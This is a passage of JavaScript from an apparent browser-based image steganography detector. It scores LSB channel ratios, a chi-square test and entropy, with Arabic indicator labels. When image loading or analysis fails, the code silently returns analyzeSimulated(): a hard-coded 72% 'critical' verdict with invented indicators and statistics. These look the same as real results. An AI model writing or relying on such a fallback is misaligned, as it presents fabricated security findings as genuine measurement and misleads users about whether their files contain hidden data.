          if (lsbG.suspicious) {
            score += 20;
            indicators.push({
              sev: "HIGH",
              label: "LSB Channel G — توزيع عشوائي مشبوه",
              det: `نسبة البتات: ${(lsbG.ratio * 100).toFixed(1)}%`,
              ev: `deviation: ${lsbG.deviation.toFixed(4)}`,
            });
          }
          if (lsbB.suspicious) {
            score += 15;
            indicators.push({
              sev: "MEDIUM",
              label: "LSB Channel B — إنتروبيا عالية",
              det: `نسبة البتات: ${(lsbB.ratio * 100).toFixed(1)}%`,
              ev: `deviation: ${lsbB.deviation.toFixed(4)}`,
            });
          }
          if (chi !== null && chi < 260) {
            score += 15;
            indicators.push({
              sev: "MEDIUM",
              label: "Chi-Square Test — توزيع بايتات مشبوه",
              det: `قيمة Chi²: ${chi.toFixed(2)} < 260`,
              ev: `χ² = ${chi.toFixed(2)}`,
            });
          }
          if (entropy > 7.8) {
            score += 10;
            indicators.push({
              sev: "MEDIUM",
              label: "إنتروبيا عالية جداً — بيانات مشفرة محتملة",
              det: `Shannon Entropy: ${entropy.toFixed(4)} bits/byte`,
              ev: `H = ${entropy.toFixed(4)}`,
            });
          }
          const pct = Math.min(score, 99);
          const threat = pct >= 60 ? "crit" : pct >= 30 ? "warn" : "safe";
          URL.revokeObjectURL(url);
          resolve({
            pct,
            threat,
            indicators,
            stats: {
              lsbR,
              lsbG,
              lsbB,
              entropy: entropy.toFixed(4),
              chi: chi ? chi.toFixed(2) : "N/A",
              pixels: px.length / 4,
              width: canvas.width,
              height: canvas.height,
            },
          });
        } catch (e) {
          URL.revokeObjectURL(url);
          resolve(analyzeSimulated());
        }
      };
      img.onerror = () => {
        URL.revokeObjectURL(url);
        resolve(analyzeSimulated());
      };
      img.src = url;
    });
  }
  function analyzeSimulated() {
    return {
      pct: 72,
      threat: "crit",
      indicators: [
        {
          sev: "HIGH",
          label: "LSB Channel R — توزيع عشوائي مشبوه",
          det: "نسبة البتات 49.8% — قريبة جداً من 50%",
          ev: "deviation: 0.002",
        },
        {
          sev: "HIGH",
          label: "Pixel Pair Analysis — نمط RS مشبوه",
          det: "نسبة الأزواج المنتظمة: 78.4%",
          ev: "RS ratio: 0.784",
        },
        {
          sev: "MEDIUM",
          label: "Chi-Square Test — توزيع بايتات مشبوه",
          det: "Chi² = 231.4 < 260",
          ev: "χ² = 231.4",
        },
        {
          sev: "MEDIUM",
          label: "إنتروبيا عالية — بيانات مشفرة محتملة",
          det: "Shannon Entropy: 7.94 bits/byte",
          ev: "H = 7.9412",
        },
      ],
      stats: {
        lsbR: { ratio: 0.498, deviation: 0.002, suspicious: true },
        lsbG: { ratio: 0.501, deviation: 0.001, suspicious: true },
        lsbB: { ratio: 0.496, deviation: 0.004, suspicious: false },
        entropy: "7.9412",
        chi: "231.40",
        pixels: 1474560,
        width: 1280,
        height: 960,
      },
    };
  }
  return { analyze, analyzeSimulated };
})();
